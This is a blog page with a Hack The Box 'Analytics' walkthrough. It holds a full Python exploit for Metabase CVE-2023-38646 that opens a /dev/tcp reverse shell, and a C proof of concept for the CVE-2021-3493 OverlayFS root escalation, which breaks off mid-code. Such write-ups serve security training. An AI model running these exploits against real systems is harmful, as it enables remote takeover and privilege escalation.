@@ -1,0 +1,330 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB: Analytics | Lavande&#39;s Blog</title>
+  <meta name="author" content="Lavande">
+  
+  <meta name="description" content="nmap扫描结果
+1234567891011121314151617# Nmap 7.92 scan initiated Tue Oct 10 08:06:33 2023 as: nmap -sC -sV -oN nmap 10.129.139.185Nmap scan report for 10.129.139.185Host is up (0.82s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://analytical.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Oct 10 08:10:18 2023 -- 1 IP address (1 host up) scanned in 225.68 seconds
+
+
+
+
+login界面
+
+将域名添加到hosts文件中
+
+login界面"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB: Analytics"/>
+  <meta property="og:site_name" content="Lavande&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Lavande&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Lavande&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB: Analytics</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/../images/image-20231121231100185.png" alt="image-20231121231100185"></p>
+<p>nmap扫描结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92 scan initiated Tue Oct 10 08:06:33 2023 as: nmap -sC -sV -oN nmap 10.129.139.185</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.139.185</span><br><span class="line">Host is up (0.82s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://analytical.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Oct 10 08:10:18 2023 -- 1 IP address (1 host up) scanned in 225.68 seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20231121231045845.png" alt="image-20231121231045845"></p>
+<p>login界面</p>
+<p><img src="/../images/image-20231121231301938.png" alt="image-20231121231301938"></p>
+<p>将域名添加到hosts文件中</p>
+<p><img src="/../images/image-20231121231602880.png" alt="image-20231121231602880"></p>
+<p>login界面</p>
+<p><img src="/../images/image-20231121231721442.png" alt="image-20231121231721442"></p>
+<p>Metabase登录</p>
+<p>找到相应的CVE： CVE-2023–38646</p>
+<p><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/">https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/</a></p>
+<p>利用exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 HTB_Analytics_poc.py &lt;listener ip&gt; &lt;listener port&gt;&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">rnb = random.randint(<span class="number">100000</span>, <span class="number">999999</span>)</span><br><span class="line">rstr = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the URL</span></span><br><span class="line">url = <span class="string">&quot;http://data.analytical.htb/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Encode &quot;shell&quot; to base64</span></span><br><span class="line">original_text = <span class="string">f&quot;sh -i &amp;&gt; /dev/tcp/<span class="subst">&#123;sys.argv[<span class="number">1</span>]&#125;</span>/<span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span> 0&gt;&amp;1&quot;</span></span><br><span class="line">base64_encoded = base64.b64encode(original_text.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Count &quot;=&quot; characters at the end</span></span><br><span class="line">equals_count = base64_encoded.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Append spaces to &quot;shell&quot; based on the count of &quot;=&quot; characters</span></span><br><span class="line">modified_text = original_text + <span class="string">&#x27; &#x27;</span> * equals_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Encode the modified text to base64 again</span></span><br><span class="line">final_base64_encoded = base64.b64encode(modified_text.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a GET request to the URL</span></span><br><span class="line">response2 = requests.get(url + <span class="string">&quot;api/session/properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the request was successful (status code 200)</span></span><br><span class="line"><span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># Parse the JSON response</span></span><br><span class="line">    data2 = response2.json()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract the value associated with &quot;setup-token&quot;</span></span><br><span class="line">    setup_token = data2.get(<span class="string">&quot;setup-token&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> setup_token:</span><br><span class="line">        token = setup_token</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No &#x27;setup-token&#x27; found in the response.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to retrieve data. Status Code:&quot;</span>, response2.status_code)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">    <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: <span class="string">&quot;zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER &quot;</span> + rstr + <span class="string">&quot; BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;echo,&quot;</span> + final_base64_encoded + <span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\n$$--=x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;advanced-options&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;ssl&quot;</span>: <span class="literal">True</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;h2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: rnb</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the data dictionary to a JSON string</span></span><br><span class="line">json_data = json.dumps(data)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] get reverse shell&quot;</span>)</span><br><span class="line"></span><br><span class="line">revshell = session.post(url + <span class="string">&quot;api/setup/validate&quot;</span> , headers=headers, data=json_data)</span><br></pre></td></tr></table></figure>
+
+<p>注意到自己是在一个docker中</p>
+<p><img src="/../images/image-20231121232913969.png" alt="image-20231121232913969"></p>
+<p>查看环境变量</p>
+<p><img src="/../images/image-20231121233059998.png" alt="image-20231121233059998"></p>
+<p>ssh连接尝试</p>
+<p><img src="/../images/image-20231121233211059.png" alt="image-20231121233211059"></p>
+<p><img src="/../images/image-20231121233238669.png" alt="image-20231121233238669"></p>
+<p>user flag :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">metalytics@analytics:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">6c7eb0d613df7c0a1036706d975a8b8f</span><br></pre></td></tr></table></figure>
+
+<p>root：</p>
+<p><img src="/../images/image-20231121233533192.png" alt="image-20231121233533192"></p>
+<p>存在OS漏洞：CVE-2021-3493 <a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493?source=post_page-----bd3421cba76d--------------------------------">https://github.com/briskets/CVE-2021-3493?source=post_page-----bd3421cba76d--------------------------------</a></p>
+<p>POC：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;attr/xattr.h&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;sys/xattr.h&gt;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setxattr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">void</span> *value, <span class="type">size_t</span> size, <span class="type">int</span> flags)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIR_BASE    <span class="string">&quot;./ovlcap&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIR_WORK    DIR_BASE <span class="string">&quot;/work&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIR_LOWER   DIR_BASE <span class="string">&quot;/lower&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIR_UPPER   DIR_BASE <span class="string">&quot;/upper&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIR_MERGE   DIR_BASE <span class="string">&quot;/merge&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIN_MERGE   DIR_MERGE <span class="string">&quot;/magic&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIN_UPPER   DIR_UPPER <span class="string">&quot;/magic&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">xmkdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mkdir(path, mode) == <span class="number">-1</span> &amp;&amp; errno != EEXIST)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mkdir %s&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">xwritefile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(path, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, path);</span><br><span class="line">    <span class="type">ssize_t</span> len = (<span class="type">ssize_t</span>) <span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="keyword">if</span> (write(fd, data, len) != len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">xcopyfile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *src, <span class="type">const</span> <span class="type">char</span> *dst, <span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fi, fo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fi = open(src, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, src);</span><br><span class="line">    <span class="keyword">if</span> ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, dst);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="type">ssize_t</span> rd, wr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        rd = read(fi, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (rd == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rd == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read %s&quot;</span>, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *p = buf;</span><br><span class="line">        <span class="keyword">while</span> (rd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            wr = write(fo, p, rd);</span><br><span class="line">            <span class="keyword">if</span> (wr == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, dst);</span><br><span class="line">            &#125;</span><br><span class="line">            p += wr;</span><br><span class="line">            rd -= wr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fi);</span><br><span class="line">    close(fo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">exploit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;rm -rf &#x27;%s/&#x27;&quot;</span>, DIR_BASE);</span><br><span class="line">    system(buf);</span><br><span class="line"></span><br><span class="line">    xmkdir(DIR_BASE, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_WORK,  <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_LOWER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_UPPER, <span class="number">0777</span>);</span><br><span class="line">    xmkdir(DIR_MERGE, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="type">gid_t</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;unshare&quot;</span>);</span><br><span class="line"></span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/uid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    xwritefile(<span class="string">&quot;/proc/self/gid_map&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;</span>, DIR_LOWER, DIR_UPPER, DIR_WORK);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, DIR_MERGE, <span class="string">&quot;overlay&quot;</span>, <span class="number">0</span>, buf) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mount %s&quot;</span>, DIR_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// all+ep</span></span><br><span class="line">    <span class="type">char</span> cap[] = <span class="string">&quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    xcopyfile(<span class="string">&quot;/proc/self/exe&quot;</span>, BIN_MERGE, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (setxattr(BIN_MERGE, <span class="string">&quot;security.capability&quot;</span>, cap, <span class="keyword">sizeof</span>(cap) - <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;setxattr %s&quot;</span>, BIN_MERGE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;magic&quot;</span>) || (argc &gt; <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;shell&quot;</span>))) &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;--norc&quot;</span>, <span class="string">&quot;--noprofile&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;execl /bin/bash&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        _exit(exploit());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        waitpid(child, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(BIN_UPPER, BIN_UPPER, <span class="string">&quot;shell&quot;</span>, 